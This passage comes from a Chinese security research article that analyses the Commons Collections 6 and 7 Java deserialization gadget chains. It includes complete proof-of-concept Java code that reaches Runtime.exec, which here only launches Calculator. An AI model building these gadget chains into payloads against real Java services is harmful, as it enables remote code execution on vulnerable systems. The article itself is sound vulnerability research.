                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
    
            HashMap innermap = new HashMap();
            LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
        }
    }

在cc5，通过对TiedMapEntry#toString方法的调用，触发了TiedMapEntry#getValue，从而触发了LazyMap#get完成后半段的调用。

而在cc6中则是通过TiedMapEntry#hashCode触发对TiedMapEntry#getValue的调用：

![-w890](https://images.seebug.org/content/images/2020/06/11/1591853430000-56nosct.png-w331s)

那么poc就是如下这样的：

    
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import org.apache.commons.collections4.keyvalue.TiedMapEntry;
    
    import java.util.HashMap;
    
    public class cc6 {
    
        public static void main(String[] args){
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
    
            HashMap innermap = new HashMap();
            LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
    
            TiedMapEntry tiedmap = new TiedMapEntry(map,123);
            tiedmap.hashCode();
        }
    }

接着就需要找哪里触发了hashCode，cc6中使用的是HashMap#hash：

![-w804](https://images.seebug.org/content/images/2020/06/11/1591853431000-57slykj.png-w331s)

这里的k目前还不是我们可控的，所以需要找某个点调用了hash方法，并且传递的参数是我们可控的，这里用到了HashMap#put：

![-w747](https://images.seebug.org/content/images/2020/06/11/1591853431000-58wctwl.png-w331s)

然而这里的key还是不是我们可控的，所以还需要找某个点调用了put方法，并且传递的第一个参数是我们可控的，最后找到了HashSet#readObject：

![-w741](https://images.seebug.org/content/images/2020/06/11/1591853431000-59deirn.png-w331s)

这里调用了map.put，其中map可以控制为HashMap，而传入的第一个参数e是用readObject取出来的，那么对应的我们就看看writeObject怎么写的：

![-w641](https://images.seebug.org/content/images/2020/06/11/1591853432000-60ikukr.png-w331s)

情况很清晰明了了，我们需要控制传入map的keySet返回结果来控制变量。

POC：

    
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import org.apache.commons.collections4.keyvalue.TiedMapEntry;
    
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.util.HashSet;
    import java.util.Map;
    import java.util.Set;
    
    public class cc6 {
    
        public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
    
            HashMap innermap = new HashMap();
            LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
    
            TiedMapEntry tiedmap = new TiedMapEntry(map,123);
    
            HashSet hashset = new HashSet(1);
            hashset.add("foo");
    
            Field field = Class.forName("java.util.HashSet").getDeclaredField("map");
            field.setAccessible(true);
            HashMap hashset_map = (HashMap) field.get(hashset);
    
            Field table = Class.forName("java.util.HashMap").getDeclaredField("table");
            table.setAccessible(true);
            Object[] array = (Object[])table.get(hashset_map);
    
            Object node = array[0];
    
            Field key = node.getClass().getDeclaredField("key");
            key.setAccessible(true);
            key.set(node,tiedmap);
    
            try{
                ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc6"));
                outputStream.writeObject(hashset);
                outputStream.close();
    
                ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc6"));
                inputStream.readObject();
            }catch(Exception e){
                e.printStackTrace();
            }
    
    
    
    
    
    
    
        }
    }

别看下边复杂，其实最终的目的只是通过反射修改keySet的返回结果为[TiedMapEntry]而已。。

## Commons Collections 7

测试环境：

  * jdk 1.8
  * Commons Collections 3.1

### 利用链

    
    
    /*
        Payload method chain:
        java.util.Hashtable.readObject
        java.util.Hashtable.reconstitutionPut
        org.apache.commons.collections.map.AbstractMapDecorator.equals
        java.util.AbstractMap.equals
        org.apache.commons.collections.map.LazyMap.get
        org.apache.commons.collections.functors.ChainedTransformer.transform
        org.apache.commons.collections.functors.InvokerTransformer.transform
        java.lang.reflect.Method.invoke
        sun.reflect.DelegatingMethodAccessorImpl.invoke
        sun.reflect.NativeMethodAccessorImpl.invoke
        sun.reflect.NativeMethodAccessorImpl.invoke0
        java.lang.Runtime.exec
    */

### 利用链分析

cc7后半段与cc1相同，前半段（如何触发LazyMap#get）不同，老规矩，先把相同部分的payload抄下来。

    
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import org.apache.commons.collections4.keyvalue.TiedMapEntry;
    
    import java.util.AbstractMap;
    import java.util.HashMap;
    
    public class cc7 {
        public static void main(String[] args){
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
    
            HashMap innermap = new HashMap();
            LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
        }
    }

在cc1中是通过AnnotationInvocationHandler#invoke来触发对恶意代理handler调用其invoke方法从而触发LazyMap#get方法。

而cc7中更加的直接，通过AbstractMap#equals来触发对LazyMap#get方法的调用：

![-w744](https://images.seebug.org/content/images/2020/06/11/1591853432000-61sjirm.png-w331s)

如果这里的m是我们可控的，那么我们设置m为LazyMap，即可完成后面的rce触发。

先寻找调用equals方法的点，cc7中使用了HashTable#reconstitutionPut：

![-w655](https://images.seebug.org/content/images/2020/06/11/1591853432000-62jxcqh.png-w331s)

这里的key如果是我们可控的，那么m就是我们可控的，接着在HashTable#readObject中调用了reconstitutionPut方法，并将key传递进去：

![-w615](https://images.seebug.org/content/images/2020/06/11/1591853433000-63nbjum.png-w331s)

fine，链已经分析完了，接下来就是看如何对参数进行控制的问题了。

在readObject方法中传递进去的key，是使用readObject得到的，那么在writeObject处，也必然会有：

![-w755](https://images.seebug.org/content/images/2020/06/11/1591853433000-64rcvzu.png-w331s)

很明显了，这里传递的实际上就是HashTable#put时添加进去的key和value。

POC：

这里继续解释一下几个细节点：

  * 为什么要调用两次put?

在第一次调用reconstitutionPut时，会把key和value注册进table中：

![-w684](https://images.seebug.org/content/images/2020/06/11/1591853433000-65ucjdy.png-w331s)

![-w847](https://images.seebug.org/content/images/2020/06/11/1591853433000-66vsaoc.png-w331s)

此时由于tab[index]里并没有内容，所以并不会走进这个for循环内，而是给将key和value注册进tab中。在第二次调用reconstitutionPut时，tab中才有内容，我们才有机会进入到这个for循环中，从而调用equals方法。这也是为什么要调用两次put的原因。

2.为什么调用的两次put其中map中key的值分别为yy和zZ?

![-w637](https://images.seebug.org/content/images/2020/06/11/1591853433000-67nabwv.png-w331s)

图中箭头指向的地方，这里的index要求两次都一样，否则无法获取到上一次的结果，再看看index是哪里来的：

![-w548](https://images.seebug.org/content/images/2020/06/11/1591853434000-68mhrto.png-w331s)

这里index的计算方式关键是hash，而hash是通过key.hashCode得来的，在java中有一个小bug：

    
    
    "yy".hashCode() == "zZ".hashCode()

正是这个小bug让这里能够利用，所以这里我们需要将map中put的值设置为yy和zZ，使两次计算的index都一样，才能够进入到for循环中。

  * 为什么在调用完HashTable#put之后，还需要在map2中remove掉yy？

这是因为HashTable#put实际上也会调用到equals方法：

![-w931](https://images.seebug.org/content/images/2020/06/11/1591853434000-69oetue.png-w331s)

当调用完equals方法后，map2的key中就会增加一个yy键，而这个键的值为UNIXProcess这个类的实例：

![-w464](https://images.seebug.org/content/images/2020/06/11/1591853434000-70ajkvq.png-w331s)

这个实例并没有继承Serializable，所以是无法被序列化存进去的，如果我们不进行remove，则会报出这样一个错误：

![-w799](https://images.seebug.org/content/images/2020/06/11/1591853434000-71sqrab.png-w331s)

所以我们需要将这个yy键-值给移除掉，从这里也能明白，实际上我们在反序列化前已经成功的执行了一次命令。但是为了反序列化时可以成功执行命令，就需要把这个键给移除掉。

## 总结

在分析完cc所有的链（在官方仓库内的）后，可以得出如下结论，cc的链大抵分为三段：

  * readObject触发
  * 调用transform方法
  * 触发后续链达到rce的目的

## 版本相关

  * 1、3、5、6、7是Commons Collections<=3.2.1中存在的反序列化链。

  * 2、4是Commons Collections 4.0以上中存在的反序列化链。

  * 同时还对JDK的版本有要求，我使用的测试版本为1.7和1.8。

## 感谢

这是我初次接触反序列化，在复现学习的时候也遇到了很多坑...感谢以下的人对我提供的帮助：Lucifaer、sn00py、Passerby...

当然还学习了网上很多的文章，但是由于数量太多了...我就不放了。。本篇文章相当于在巨人的肩膀上写出来的，在这里统一感谢各位前辈的文章，如果这篇文章有什么错误的地方，欢迎指出来，我会对其进行修改。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1242/>

